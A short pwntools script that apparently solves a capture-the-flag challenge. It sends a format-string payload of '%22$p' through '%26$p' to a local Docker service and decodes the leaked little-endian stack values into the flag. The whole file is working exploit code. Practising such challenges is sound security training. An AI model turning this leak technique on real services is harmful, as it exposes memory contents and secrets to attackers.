from pwn import *

# 1. Configuration
# Change '127.0.0.1' to your server IP if running remotely
target_ip = '127.0.0.1'
target_port = 8006

def get_flag():
    # Connect to the Docker container
    io = remote(target_ip, target_port)

    # 2. Prepare the Payload
    # We found the flag starts at offset 22 and ends at 26
    payload = "%22$p %23$p %24$p %25$p %26$p"

    # 3. Send the payload
    io.sendlineafter(b"last play: ", payload.encode())

    # 4. Receive the leaked hex
    io.recvuntil(b"Referee's Log: ")
    leaked_data = io.recvline().decode().strip().split()
    
    io.close()

    # 5. Decode the Little-Endian Hex
    full_flag = ""
    for hex_val in leaked_data:
        # Strip '0x', convert to bytes, and reverse (Little Endian)
        clean_hex = hex_val.replace("0x", "")
        # Handle cases where hex might be missing a leading zero
        if len(clean_hex) % 2 != 0:
            clean_hex = "0" + clean_hex
            
        byte_data = bytes.fromhex(clean_hex)
        full_flag += byte_data[::-1].decode('utf-8', errors='ignore')

    return full_flag

if __name__ == "__main__":
    print("[*] Attacking the VAR Review System...")
    flag = get_flag()
    print(f"[+] Found Flag: {flag}")
